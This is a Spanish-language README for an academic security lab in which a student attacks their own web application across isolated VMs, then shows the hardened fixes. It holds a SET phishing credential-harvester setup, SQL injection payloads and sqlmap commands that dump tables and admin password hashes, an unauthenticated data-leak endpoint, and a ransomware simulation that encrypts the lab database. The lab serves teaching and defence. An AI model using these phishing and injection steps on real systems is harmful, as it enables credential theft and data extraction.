# Laboratorio INFOSISTEL — Actividad N°1 (caso NovaTech)

> **Repositorio:** `infosistel-lab` (rama `main`) · **Solo para VMs aisladas** · **No usar en el VPS ni en el dominio real**

Este laboratorio reproduce, sobre la **propia** aplicación INFOSISTEL, los tres
eslabones de la *kill chain* del caso NovaTech —**phishing → inyección SQL →
ransomware**— y agrega un cuarto escenario de **control de acceso / fuga de
PII**. Todo el código vulnerable está concentrado en `src/app/api/lab/*` y en
el seed `scripts/lab/seed-lab.ts`. Este repo es la copia de laboratorio; el
proyecto endurecido vive en el repo original `infosistelv2` (`main`).

La idea es que puedas hacer la demo dos veces:

| Momento | Cómo | Qué muestra |
|---|---|---|
| **Antes** | Este repo + `LAB_MODE=1` | Las 4 vulnerabilidades explotables de punta a punta |
| **Después** | Repo `infosistelv2` (`main`) o este repo con `LAB_MODE=0` | Rutas 404, SQL parametrizado, MFA, rate limit, PII cifrada, backups |

---

## 0. Advertencia legal y ética

- Usa esto **únicamente** en las dos VMs de tu laboratorio (`10.10.10.0/24`),
  con tu propio código y datos ficticios.
- No expongas el puerto 3000 a Internet ni ejecutes las pruebas contra
  `infosistel.com.pe` ni contra ningún sistema de terceros.
- En Perú, la **Ley N° 29733** (Protección de Datos Personales) y la
  **Ley N° 30096** (Delitos Informáticos) siguen aplicando incluso en un
  laboratorio: usa datos ficticios, no copies PII real de clientes a la VM.
- Guarda la autorización de tu docente/empresa junto con las evidencias.
- ISO/IEC 27001:2022 **no es una ley**: es una norma voluntaria de gestión.
  El mapeo está en [`iso27001-2022-infosistel.md`](./iso27001-2022-infosistel.md).

---

## 1. Arquitectura del laboratorio

```
┌──────────────────────────────┐          ┌──────────────────────────────┐
│  VM NEGRA — Atacante         │          │  VM AZUL — Víctima           │
│  Kali Linux                  │  red     │  Kali Linux                  │
│  10.10.10.10                 │  aislada │  10.10.10.20                 │
│                              │ 10.10.10.0/24                          │
│  - setoolkit (phishing)      │◄────────►│  - INFOSISTEL clonado        │
│  - sqlmap (SQLi)             │          │  - Next.js en :3000          │
│  - python3 (ransomware sim)  │          │  - lab-data/lab.db (SQLite)  │
│  - curl, navegador           │          │  - scripts/lab/*             │
└──────────────────────────────┘          └──────────────────────────────┘
```

Recomendaciones de virtualización:

- Ambas VMs en **red interna / host-only** (no NAT con salida a Internet).
- Snapshot de la VM azul **antes** de cada demo (sobre todo antes de
  `--live` del ransomware).
- 2 vCPU / 2–4 GB RAM para la VM azul es suficiente.

---

## 2. Preparar la VM azul (víctima)

### 2.1 Requisitos

```bash
node -v    # Next.js 16 pide Node >= 20.9; recomendado Node 22 LTS
npm -v
python3 -V # 3.10+
git --version
```

Si Kali trae Node 18, instala Node 22 con `nvm`:

```bash
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
source ~/.bashrc
nvm install 22
nvm use 22
```

Dependencias nativas de `better-sqlite3` / `sharp`:

```bash
sudo apt update
sudo apt install -y build-essential python3 make g++ openssl
```

### 2.2 Clonar el repositorio del laboratorio

**Opción A — desde GitHub (recomendada).** Este repo es independiente:

```bash
cd ~
git clone https://github.com/TU_USUARIO/infosistel-lab.git
# o, si ya configuraste SSH:
# git clone git@github.com:TU_USUARIO/infosistel-lab.git
cd infosistel-lab
```

> Reemplaza `TU_USUARIO/infosistel-lab` por la URL real del repositorio que
> crees en GitHub. Es un repo separado de `infosistelv2`.

**Opción B — sin GitHub, con `git bundle`.** Desde tu máquina:

```bash
cd ~/infosistelab
git bundle create /tmp/infosistel-lab.bundle main
scp /tmp/infosistel-lab.bundle kali@10.10.10.20:~/
```

En la VM azul:

```bash
git clone ~/infosistel-lab.bundle infosistel-lab
cd infosistel-lab
```

### 2.3 Arrancar

```bash
chmod +x scripts/lab/run-lab.sh scripts/lab/smoke-test.sh
./scripts/lab/run-lab.sh --prod
# o, para desarrollo rápido:
./scripts/lab/run-lab.sh
```

El script:

1. Genera `.env.lab` (gitignored) con secretos aleatorios y una
   `DATABASE_URL` **absoluta** a `lab-data/lab.db`.
2. Ejecuta `prisma generate`, `prisma db push` y el seed. (Se usa `db push`
   y no `migrate deploy` porque el esquema tiene columnas —p. ej.
   `Admin.tokenVersion`— que se aplicaron en el VPS con `db push` y no tienen
   migración versionada; la BD del laboratorio es desechable y debe coincidir
   exactamente con `prisma/schema.prisma`.)
3. Levanta Next.js en `0.0.0.0:3000` (accesible desde la VM negra).

Salida esperada (resumen):

```
Admin:      zarate / Zarate2026!
MFA:        DESACTIVADO (a propósito, para el 'antes')
Productos:  8 (itemNumber 1..8, con costPrice)
Pedidos:    4
```

### 2.4 Abrir el puerto en la VM azul

```bash
sudo ufw allow from 10.10.10.0/24 to any port 3000 proto tcp
```

Comprueba desde la VM negra:

```bash
curl http://10.10.10.20:3000/api/lab/products?id=1
```

Si responde JSON con `costPrice`, el laboratorio está listo.

### 2.5 Smoke test (opcional, desde la VM azul o negra)

```bash
BASE_URL=http://10.10.10.20:3000 ./scripts/lab/smoke-test.sh
```

---

## 3. Credenciales y datos de demo

| Dato | Valor |
|---|---|
| URL del panel | `http://10.10.10.20:3000/taller-control/login` |
| Usuario | `zarate` |
| Contraseña | `Zarate2026!` |
| MFA | **Desactivado** en el repo de laboratorio (el "antes") |
| Productos | `itemNumber` 1..8, con `costPrice` |
| Pedidos | 4, uno de ellos con teléfono **en texto plano** (legacy) |

> En `main`, el seed normal (`prisma/seed.ts`) no crea admin. Usa
> `npx tsx --env-file=.env scripts/create-admin.ts` y activa MFA desde
> `/taller-control/seguridad`.

---

## 4. Ejercicio 1 — Phishing (el ingreso)

**Objetivo:** demostrar cómo un analista entrega sus credenciales y cómo el
segundo factor (Fase 6) lo habría impedido.

### 4.1 Montar el clon con SET (VM negra)

```bash
sudo setoolkit
```

Ruta en el menú:

```
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack Method
2) Site Cloner
```

- **IP para recibir el POST:** `10.10.10.10` (la VM negra).
- **URL a clonar:** `http://10.10.10.20:3000/taller-control/login`
- SET levanta un servidor en el puerto 80. Si Apache/Nginx ya lo ocupa:
  `sudo systemctl stop apache2 nginx`.

Abre en la VM azul (o en el navegador de la negra) `http://10.10.10.10` y
escribe `zarate` / `Zarate2026!`.

> **Nota técnica:** el login de Next.js usa *Server Actions*. La página clonada
> puede fallar al enviar el formulario, pero SET **registra el cuerpo del POST
> antes de responder**, así que las credenciales quedan capturadas en la
> terminal de SET. Si el clon no renderiza bien, usa la opción de SET
> "Site Cloner" con el modo `form-based` o guarda la página con el navegador y
> cambia el `action` del formulario a la IP de la VM negra.

### 4.2 Usar las credenciales robadas

En la VM negra:

```bash
curl -i -c /tmp/cookies.txt \
  -X POST http://10.10.10.20:3000/taller-control/login \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username=zarate&password=Zarate2026!'
```

O simplemente abre el login real en el navegador y entra con
`zarate` / `Zarate2026!`: **entra sin segundo factor**.

### 4.3 Discurso (30 s)

> «En NovaTech, el eslabón inicial no fue técnico: fue humano. Cloné el login
> real de INFOSISTEL con SET y capturé las credenciales de `zarate`. En la
> versión vulnerable, esas credenciales bastan para entrar al panel. En la
> versión endurecida, el login exige un código TOTP (Fase 6), limita a 5
> intentos cada 15 minutos y almacena la contraseña con `scrypt`, no en texto
> claro. El phishing sigue existiendo, pero deja de ser suficiente.»

### 4.4 "Después"

En `main` (o con MFA activado):

1. El login con la contraseña robada devuelve el paso de **MFA**.
2. 6 intentos fallidos seguidos → mensaje de bloqueo temporal (rate limit).
3. El hash en la BD es `salt:hash` de `scrypt`, nunca la contraseña.

---

## 5. Ejercicio 2 — Inyección SQL (escalada y exfiltración)

**Objetivo:** demostrar la fuga de `costPrice` (margen) y la extracción de la
BD con SQLmap. La ruta vulnerable concatena el parámetro y devuelve errores
verbosos.

### 5.1 Prueba manual (VM negra)

```bash
# Caso normal: un producto
curl -s 'http://10.10.10.20:3000/api/lab/products?id=1' | python3 -m json.tool

# Bypass de la condición: devuelve TODOS los productos
curl -s 'http://10.10.10.20:3000/api/lab/products?id=1%20OR%201=1' | python3 -m json.tool

# Inyección en el parámetro de texto
curl -s "http://10.10.10.20:3000/api/lab/products?q=%27%20OR%20%271%27%3D%271" | python3 -m json.tool
```

Observa en la respuesta:

- `"costPrice": 1950` (precio de costo, dato interno).
- `"sql": "... WHERE itemNumber = 1 OR 1=1 ..."` (la consulta se refleja).
- Si fuerzas un error, el mensaje de SQLite vuelve al cliente.

### 5.2 SQLmap

```bash
# Detección
sqlmap -u "http://10.10.10.20:3000/api/lab/products?id=1" -p id \
  --batch --level=3 --risk=2 --technique=BEU

# Tablas y volcado del catálogo
sqlmap -u "http://10.10.10.20:3000/api/lab/products?id=1" -p id \
  --batch --tables
sqlmap -u "http://10.10.10.20:3000/api/lab/products?id=1" -p id \
  --batch --dump -T Product

# Credenciales del panel
sqlmap -u "http://10.10.10.20:3000/api/lab/products?id=1" -p id \
  --batch --sql-query="SELECT username, passwordHash, role FROM Admin"
```

> SQLite no tiene el concepto de "base de datos" de MySQL/PostgreSQL, por eso
> `--dbs` puede devolver vacío. Usa `--tables`, `--dump` o `--sql-query`.

### 5.3 "Después"

```bash
# La misma consulta contra la versión corregida:
curl -s 'http://10.10.10.20:3000/api/lab/products-secure?id=1' | python3 -m json.tool
```

- No aparece `costPrice`.
- No aparece la consulta SQL.
- Un `id` no numérico devuelve `400`, no un error de SQLite.
- En `main` la ruta `/api/lab/products` **no existe** (404).

**Explicación:** Prisma parametriza las consultas (`findMany`, `$queryRaw` con
template tag). El fallo no se corrige "escapando comillas": se corrige dejando
de construir SQL con strings y usando un `select` explícito (allowlist).

### 5.4 Discurso (45 s)

> «En NovaTech, después del phishing, los atacantes encontraron una aplicación
> interna desactualizada y usaron SQL Injection para extraer la base de datos.
> En INFOSISTEL documenté el mismo patrón en `/api/products`: la ruta exponía
> `costPrice` por falta de un `select` explícito. Aquí está la versión
> vulnerable: con `id=1 OR 1=1` obtengo todos los productos y su margen. Con
> SQLmap puedo enumerar tablas y llegar a los hashes de los administradores.
> La corrección es doble: consulta parametrizada y allowlist de campos. El
> "después" devuelve exactamente los mismos productos, pero sin el costo ni la
> consulta SQL.»

---

## 6. Ejercicio 3 — Broken Access Control / IDOR + PII

**Objetivo:** separar "inyección" de "control de acceso". Aquí la consulta es
segura (Prisma), pero **no hay autenticación** y se devuelve PII descifrada.

### 6.1 Prueba

```bash
# Lista los últimos pedidos, sin cookie ni token
curl -s 'http://10.10.10.20:3000/api/lab/orders' | python3 -m json.tool

# Pedido concreto (usa un id que aparezca en la respuesta anterior)
curl -s 'http://10.10.10.20:3000/api/lab/orders?id=<ORDER_ID>' | python3 -m json.tool

# Búsqueda por celular
curl -s 'http://10.10.10.20:3000/api/lab/orders?phone=987654321' | python3 -m json.tool
```

Observa:

- `customerPhone` en texto claro (se descifra para la respuesta).
- El pedido `LAB-Legacy sin cifrar` muestra el teléfono **tal cual está en la
  BD** (el "antes" de la Fase 4).
- Cualquiera en la red puede enumerar pedidos cambiando `id`.

### 6.2 "Después"

- En `main` no existe una ruta pública de pedidos.
- El panel `/taller-control/pedidos` está detrás de `requireSession()` y del
  `proxy.ts` (JWT + `tokenVersion`).
- La BD guarda `customerPhone` como `iv:authTag:ciphertext` (AES-256-GCM) y
  usa `customerPhoneIndex` (HMAC) para búsquedas exactas sin descifrar.

Verificación:

```bash
sqlite3 lab-data/lab.db 'SELECT customerName, customerPhone FROM "Order";'
```

En `main`, ningún teléfono debe verse legible.

### 6.3 Discurso (30 s)

> «No todas las brechas son inyección. Este endpoint usa Prisma, así que
> SQLmap no aplica: el fallo es que no pregunta "¿quién eres?". Cualquiera en
> la red puede listar pedidos y leer teléfonos. En la versión endurecida, la
> ruta no existe públicamente, el panel exige sesión y rol, y el teléfono está
> cifrado en reposo con AES-256-GCM. Si roban un backup, no obtienen los
> teléfonos en claro.»

---

## 7. Ejercicio 4 — Ransomware (el impacto final)

**Objetivo:** demostrar el impacto de cifrado y la diferencia entre "tener
backups" y "haber probado la restauración".

> El script **no es ransomware real**: no se propaga, no persiste, no exfiltra,
> no contacta a ningún servidor y guarda la clave para restaurar. Solo cifra
> un archivo.

### 7.1 Demo segura (no toca la BD que usa la app)

```bash
# Cifra una COPIA en lab-data/ransom-demo/ y deja lab-data/lab.db intacta
python3 scripts/lab/ransomware-sim.py --target lab-data/lab.db

# La app sigue funcionando:
curl -s 'http://10.10.10.20:3000/api/lab/products?id=1' | head -c 200

# Restaurar la copia
python3 scripts/lab/ransomware-sim.py --target lab-data/lab.db --restore
```

### 7.2 Demo "real" sobre la BD del laboratorio (con snapshot)

```bash
# 1) Snapshot de la VM azul.
# 2) Detén la app (Ctrl+C en la terminal de run-lab.sh).
# 3) Cifra la BD real del laboratorio:
python3 scripts/lab/ransomware-sim.py --target lab-data/lab.db --live --yes-i-have-snapshot

# 4) Intenta levantar la app: las páginas que consultan la BD fallan.
./scripts/lab/run-lab.sh --no-seed
#    (o solo intenta abrir la BD)
sqlite3 lab-data/lab.db '.tables'   # -> "file is not a database"

# 5) Restaura:
python3 scripts/lab/ransomware-sim.py --target lab-data/lab.db --live --restore
./scripts/lab/run-lab.sh --no-seed
```

### 7.3 "Después"

- `scripts/deploy-vps.sh` respalda `dev.db` **antes** de cada
  `prisma migrate deploy` (copia en `infosistel-v2-data/backups/`).
- Permisos `600` para `.env` y la BD (Fase 5).
- El hardening documenta la brecha pendiente: los backups viven en el mismo
  VPS, no hay cron fijo y no se ha probado una restauración completa. **Eso
  también se expone como lección**: un backup no verificado no es un backup.
- Recomendación para la tesis: `restic`/`borg` a un destino externo + prueba
  de restauración mensual + registro de la prueba.

### 7.4 Discurso (30 s)

> «El impacto final de NovaTech fue el ransomware. Si cifro la BD de
> INFOSISTEL, la aplicación deja de funcionar: no hay login, no hay catálogo,
> no hay pedidos. La diferencia no es "tener un backup", es haber probado que
> el backup restaura. En mi hardening, el deploy respalda antes de migrar y
> los permisos son 600. La brecha que dejo documentada es que ese backup vive
> en el mismo VPS: el siguiente paso es replicarlo fuera y probar la
> restauración.»

---

## 8. Evidencias para la tesis

Guarda por cada ejercicio:

| Evidencia | Cómo obtenerla |
|---|---|
| Comando ejecutado | `script -q -c "sqlmap ..." docs/lab/evidencias/sqli.txt` |
| Salida completa | `... | tee -a docs/lab/evidencias/sqli.txt` |
| Captura de pantalla | VM negra + VM azul, con fecha/hora visible |
| Hash del archivo antes/después | `sha256sum lab-data/lab.db*` |
| Consulta SQL vulnerable | La respuesta incluye `"sql"` (queda en el JSON) |
| Estado HTTP | `curl -i` (200/404/500) |
| Log del servidor | Terminal de `run-lab.sh` |

Sugerencia de carpeta (no se commitea si contiene datos):

```
docs/lab/evidencias/
├── 01-phishing-set.png
├── 02-sqli-manual.txt
├── 03-sqli-sqlmap.txt
├── 04-idor-pii.json
├── 05-ransomware-antes.png
├── 06-ransomware-despues.png
└── 07-despues-headers.txt
```

---

## 9. Mostrar el "después" (versión endurecida)

### 9.1 Opción A (recomendada): repo original `infosistelv2`

El repo endurecido es independiente de este. En la VM azul:

```bash
git clone git@github.com:zarateaz/infosistelv2.git
cd infosistelv2
cp .env.example .env
# Edita .env y agrega:
#   DATABASE_URL="file:/ruta/absoluta/infosistelv2/dev.db"
#   JWT_SECRET="$(openssl rand -base64 64)"
#   ENCRYPTION_KEY="$(openssl rand -hex 32)"
#   DNI_HMAC_SECRET="$(openssl rand -hex 32)"

npx prisma generate
npx prisma db push   # BD nueva: evita el drift de Admin.tokenVersion
npx tsx --env-file=.env prisma/seed.ts
npx tsx --env-file=.env scripts/create-admin.ts
npm run build
npx next start -H 0.0.0.0 -p 3000
```

Ese repo **no tiene** `src/app/api/lab/*` ni `scripts/lab/run-lab.sh`.

### 9.2 Opción B: este mismo repo con `LAB_MODE=0`

```bash
# Detén el servidor del laboratorio (Ctrl+C) y arranca en modo endurecido:
LAB_MODE=0 ./scripts/lab/run-lab.sh --no-seed
```

Las rutas `/api/lab/*` responden **404** porque el guard está desactivado.
Los controles de hardening (CSP, headers, scrypt, cifrado de PII) siguen
activos porque este repo es una copia del proyecto endurecido. Activa MFA en
`/taller-control/seguridad` con `zarate` para el contraste de phishing.

> Para una demo totalmente limpia del "después", usa la Opción A: la BD del
> laboratorio contiene el pedido `LAB-Legacy` en texto plano a propósito.

### 9.3 Contraste rápido

```bash
# 1) Rutas de laboratorio: 404
curl -i http://10.10.10.20:3000/api/lab/products?id=1

# 2) Cabeceras de seguridad
curl -sI http://10.10.10.20:3000 | grep -Ei 'content-security|x-frame|strict-transport|x-content-type'

# 3) PII cifrada en reposo (excluye el pedido legacy del lab)
sqlite3 lab-data/lab.db \
  "SELECT customerName, customerPhone FROM \"Order\" WHERE customerName NOT LIKE 'LAB-Legacy%';"

# 4) Login: activa MFA en /taller-control/seguridad y repite el robo de
#    credenciales del ejercicio 1. El segundo factor bloquea el acceso.
```

---

## 10. Limpieza y rollback

```bash
# Detener el servidor
Ctrl+C

# Volver al modo laboratorio (vulnerable)
LAB_MODE=1 ./scripts/lab/run-lab.sh

# Borrar datos del laboratorio (opcional)
rm -rf lab-data .env.lab
```

Para el "después", usa el repo original `infosistelv2` (`main`) o arranca
este mismo repo con `LAB_MODE=0` (sección 9.2).

Si hiciste `--live` y algo salió mal:

```bash
python3 scripts/lab/ransomware-sim.py --target lab-data/lab.db --live --restore
# o revierte el snapshot de la VM
```

---

## 11. Troubleshooting

| Síntoma | Causa / solución |
|---|---|
| `Invalid environment configuration` | Falta `.env.lab` o las variables. Ejecuta `./scripts/lab/run-lab.sh` (lo genera) o revisa `src/lib/env.ts`. |
| `Cannot find module '@/generated/prisma/client'` | Falta `npx prisma generate`. El script lo hace si no existe `src/generated/prisma`. |
| `The column tokenVersion does not exist` | `migrate deploy` no incluye esa columna. Usa `npx prisma db push` (el `run-lab.sh` ya lo hace); no mezcles migraciones viejas con el esquema actual. |
| `better-sqlite3` no compila | `sudo apt install -y build-essential python3 make g++` y usa Node 20/22. |
| La app no abre la BD | Verifica que `DATABASE_URL` sea **absoluta** y apunte a `lab-data/lab.db`; no mezcles `prisma/dev.db` con `lab-data/lab.db`. |
| Desde la VM negra no conecta | `sudo ufw allow from 10.10.10.0/24 to any port 3000 proto tcp`; confirma `ss -ltnp | grep 3000` en la azul. |
| SET no captura | Detén Apache/Nginx; usa el puerto 80; revisa que la VM azul pueda abrir `http://10.10.10.10`. |
| SQLmap no detecta | Prueba `--level=5 --risk=3`, `-p id`, y confirma que `?id=1` devuelve JSON. Para SQLite usa `--tables`/`--dump`, no `--dbs`. |
| `--live` no rompe la app | Detén la app antes de cifrar; better-sqlite3 puede seguir sirviendo desde caché/páginas abiertas. |
| `file is not a database` | Es el resultado esperado del ransomware simulado; restaura con `--restore`. |

---

## 12. Qué NO se tocó (y por qué)

Para que la comparación "antes vs. después" sea honesta, este repo de
laboratorio **solo revierte los controles necesarios** para los 4 ejercicios:

- Se agregó un endpoint SQLi, un endpoint IDOR y un seed con admin sin MFA.
- **No** se desactivó el cifrado de PII, ni la CSP, ni los headers, ni el
  hashing `scrypt`, ni el rate limit del login.
- El "antes" de la Fase 4 se representa con **un pedido legacy en texto
  plano** en el seed, no desactivando el cifrado de toda la app.

Eso es deliberado: demuestra que sabes aislar un fallo y que no necesitas
"romper todo el sitio" para hacer una prueba de seguridad reproducible.

---

## 13. Archivos de este repositorio

| Archivo | Para qué |
|---|---|
| `src/lib/lab.ts` | Guard `LAB_MODE`, cabeceras y utilidades |
| `src/app/api/lab/products/route.ts` | SQLi + `costPrice` + errores verbosos |
| `src/app/api/lab/products-secure/route.ts` | Versión corregida (parametrizada + allowlist) |
| `src/app/api/lab/orders/route.ts` | IDOR + PII en claro + sin auth |
| `scripts/lab/seed-lab.ts` | Admin sin MFA, productos con costo, pedidos |
| `scripts/lab/run-lab.sh` | Arranque completo (env, db push, seed, server) |
| `scripts/lab/smoke-test.sh` | Verificación rápida de las 4 rutas |
| `scripts/lab/ransomware-sim.py` | Simulación de ransomware con restore |
| `.env.lab.example` | Plantilla de variables del laboratorio |
| `docs/lab/iso27001-2022-infosistel.md` | Mapeo ISO 27001:2022 + cláusula 4 + PDCA |
| `docs/lab/guion-exposicion.md` | Guion y texto exacto de diapositivas |
